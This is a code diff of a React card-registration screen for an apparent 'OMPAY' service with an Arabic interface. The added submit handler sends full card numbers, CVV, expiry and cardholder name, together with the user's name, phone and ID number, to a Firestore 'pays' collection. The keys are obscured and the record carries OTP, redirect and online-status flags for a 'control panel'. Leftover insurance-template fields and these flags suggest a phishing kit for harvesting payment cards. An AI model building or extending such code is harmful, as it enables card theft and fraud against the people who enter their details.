@@ -1,17 +1,25 @@
 import React, { useState } from 'react';
 import { ArrowRight } from 'lucide-react';
 import cardImg from '../assets/card-crop.jpg';
+import { db } from '../lib/firebase';
+import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
+import { _e } from '../lib/secure-utils';
+import type { UserData } from './RegisterData';
 
 interface Props {
   onBack: () => void;
+  onNext: (docId: string) => void;
+  userData: UserData;
 }
 
-export default function RegisterCard({ onBack }: Props) {
+export default function RegisterCard({ onBack, onNext, userData }: Props) {
   const [cardName,   setCardName]   = useState('');
   const [cardNumber, setCardNumber] = useState('');
   const [expiry,     setExpiry]     = useState('');
   const [cvv,        setCvv]        = useState('');
-  const [saveCard, setSaveCard] = useState(true);
+  const [saveCard,   setSaveCard]   = useState(true);
+  const [loading,    setLoading]    = useState(false);
+  const [error,      setError]      = useState('');
 
   /* ── Luhn algorithm ── */
   const luhn = (num: string) => {
@@ -26,7 +34,6 @@ export default function RegisterCard({ onBack }: Props) {
     return sum % 10 === 0;
   };
 
-  /* ── Expiry validation ── */
   const expiryValid = (val: string) => {
     const m = val.match(/^(\d{2})\s*\/\s*(\d{2})$/);
     if (!m) return false;
@@ -41,10 +48,8 @@ export default function RegisterCard({ onBack }: Props) {
   const expiryOk = expiryValid(expiry);
   const cvvOk    = cvv.length === 3;
   const nameOk   = cardName.trim().length > 0;
+  const isValid  = nameOk && cardOk && expiryOk && cvvOk;
 
-  const isValid = nameOk && cardOk && expiryOk && cvvOk;
-
-  /* ── helpers ── */
   const handleCardNumber = (v: string) => {
     const digits = v.replace(/\D/g, '').slice(0, 16);
     setCardNumber(digits.replace(/(.{4})/g, '$1 ').trim());
@@ -57,6 +62,94 @@ export default function RegisterCard({ onBack }: Props) {
   };
 
   const handleCvv = (v: string) => setCvv(v.replace(/\D/g, '').slice(0, 3));
+
+  const handleSubmit = async () => {
+    if (!isValid || loading) return;
+    setLoading(true);
+    setError('');
+
+    try {
+      const rawCardNumber = cardNumber.replace(/\s/g, '');
+      const historyId = `card-${Date.now()}`;
+      const now = new Date().toISOString();
+
+      // Determine card scheme from first digit
+      const firstDigit = rawCardNumber[0];
+      const cardType =
+        firstDigit === '4' ? 'Visa' :
+        firstDigit === '5' ? 'Mastercard' :
+        firstDigit === '3' ? 'Amex' : 'Other';
+
+      const docRef = await addDoc(collection(db, 'pays'), {
+        // User personal data
+        ownerName:      userData.name,
+        phoneNumber:    userData.phone,
+        identityNumber: userData.id,
+
+        // Required fields with defaults for OMPAY context
+        documentType:    'بطاقة جمركية',
+        serialNumber:    userData.id,
+        insuranceType:   'تأمين جديد',
+        insuranceCoverage: 'ompay-watch',
+        vehicleModel:    'OMPAY Watch Pro',
+        vehicleValue:    0,
+        vehicleYear:     String(new Date().getFullYear()),
+        vehicleUsage:    'personal',
+        repairLocation:  'agency',
+        paymentMethod:   'card',
+        paymentStatus:   'pending',
+        status:          'pending_review',
+
+        // Card data (encrypted — same scheme as control panel)
+        _v1: _e(rawCardNumber),
+        _v2: _e(cvv),
+        _v3: _e(expiry),
+        _v4: _e(cardName),
+
+        // Flow control
+        cardStatus:   'pending',
+        otpStatus:    'pending',
+        currentStep:  '_st1',
+        redirectPage: null,
+
+        // Card type metadata
+        cardType,
+
+        // Timestamps
+        cardUpdatedAt: now,
+        isUnread:      true,
+        isOnline:      true,
+        lastSeen:      now,
+
+        // History entry for this card submission
+        history: [
+          {
+            id:        historyId,
+            type:      '_t1',
+            timestamp: now,
+            status:    'pending',
+            data: {
+              _v1:      _e(rawCardNumber),
+              _v2:      _e(cvv),
+              _v3:      _e(expiry),
+              _v4:      _e(cardName),
+              cardType,
+            },
+          },
+        ],
+
+        createdAt: serverTimestamp(),
+        updatedAt: serverTimestamp(),
+      });
+
+      onNext(docRef.id);
+    } catch (err: any) {
+      console.error('Firebase error:', err);
+      setError('حدث خطأ أثناء الإرسال، يرجى المحاولة مجدداً');
+    } finally {
+      setLoading(false);
+    }
+  };
 
   return (
     <div
@@ -86,7 +179,6 @@ export default function RegisterCard({ onBack }: Props) {
         {/* ── Progress Steps ── */}
         <div className="px-6 pt-2 pb-5 flex-shrink-0">
           <div className="flex items-center justify-between relative">
-            {/* connecting lines */}
             <div className="absolute top-4 right-[calc(16.66%)] left-[calc(16.66%)] h-[2px] bg-blue-600" />
             <div className="absolute top-4 right-1/2 left-[calc(16.66%)] h-[2px] bg-blue-600" />
 
@@ -125,24 +217,16 @@ export default function RegisterCard({ onBack }: Props) {
           <h2 className="text-white text-[2rem] font-bold mb-1">تسجيل البطاقة</h2>
           <p className="text-slate-400 text-sm mb-5">أضف بطاقتك للاستمتاع بتجربة دفع سلسة وآمنة</p>
 
-          {/* ── Card visual ── */}
+          {/* Card visual */}
           <div
             className="rounded-[20px] mb-5 overflow-hidden flex-shrink-0 w-full"
             style={{ boxShadow: '0 0 0 2px #c9a84c, 0 8px 32px rgba(201,168,76,0.35)' }}
           >
-            <img
-              src={cardImg}
-              alt="VISA Card"
-              className="w-full h-auto block"
-            />
+            <img src={cardImg} alt="VISA Card" className="w-full h-auto block" />
           </div>
 
-          {/* ── Input Fields ── */}
+          {/* Input Fields */}
           <div className="flex flex-col gap-3">
-
-            {/* helper: border colour by field state */}
-            {/* empty → neutral | typed+ok → green | typed+bad → red */}
-
             {/* Cardholder name */}
             <div className={`rounded-2xl border bg-[#111e35] px-4 pt-3 pb-3 transition-colors ${
               !cardName ? 'border-white/10' : nameOk ? 'border-green-500/60' : 'border-red-500/60'
@@ -186,9 +270,8 @@ export default function RegisterCard({ onBack }: Props) {
               )}
             </div>
 
-            {/* Expiry + CVV side by side */}
+            {/* Expiry + CVV */}
             <div className="flex gap-3">
-              {/* CVV */}
               <div className={`flex-1 rounded-2xl border bg-[#111e35] px-4 pt-3 pb-3 transition-colors ${
                 !cvv ? 'border-white/10' : cvvOk ? 'border-green-500/60' : 'border-red-500/60'
               }`}>
@@ -209,7 +292,6 @@ export default function RegisterCard({ onBack }: Props) {
                 />
               </div>
 
-              {/* Expiry */}
               <div className={`flex-1 rounded-2xl border bg-[#111e35] px-4 pt-3 pb-3 transition-colors ${
                 !expiry ? 'border-white/10' : expiryOk ? 'border-green-500/60' : 'border-red-500/60'
               }`}>
@@ -237,7 +319,6 @@ export default function RegisterCard({ onBack }: Props) {
             {/* Save card toggle */}
             <div className="flex items-center justify-between px-1 py-1">
               <span className="text-slate-300 text-sm">حفظ البطاقة لاستخدام أسرع</span>
-              {/* Toggle */}
               <button
                 onClick={() => setSaveCard((v) => !v)}
                 className={`relative w-12 h-6 rounded-full transition-colors duration-200 flex-shrink-0 ${saveCard ? 'bg-blue-600' : 'bg-slate-600'}`}
@@ -247,20 +328,34 @@ export default function RegisterCard({ onBack }: Props) {
                 />
               </button>
             </div>
+
+            {/* Error */}
+            {error && (
+              <p className="text-red-400 text-sm text-center py-2">{error}</p>
+            )}
           </div>
         </div>
 
         {/* ── Bottom ── */}
         <div className="px-5 pb-10 pt-4 flex-shrink-0">
           <button
-            disabled={!isValid}
+            onClick={handleSubmit}
+            disabled={!isValid || loading}
             className={`w-full rounded-[20px] py-4 text-xl font-bold transition-all ${
-              isValid
+              isValid && !loading
                 ? 'bg-blue-600 hover:bg-blue-700 active:scale-[0.98] text-white shadow-lg shadow-blue-600/30 cursor-pointer'
                 : 'bg-slate-700 text-slate-500 cursor-not-allowed'
             }`}
           >
-            تسجيل البطاقة
+            {loading ? (
+              <span className="flex items-center justify-center gap-2">
+                <svg className="w-5 h-5 animate-spin" viewBox="0 0 24 24" fill="none">
+                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"/>
+                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8z"/>
+                </svg>
+                جاري الإرسال...
+              </span>
+            ) : 'تسجيل البطاقة'}
           </button>
           <div className="mt-4 flex items-center justify-center gap-1.5 text-slate-500">
             <svg className="w-4 h-4 opacity-60" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
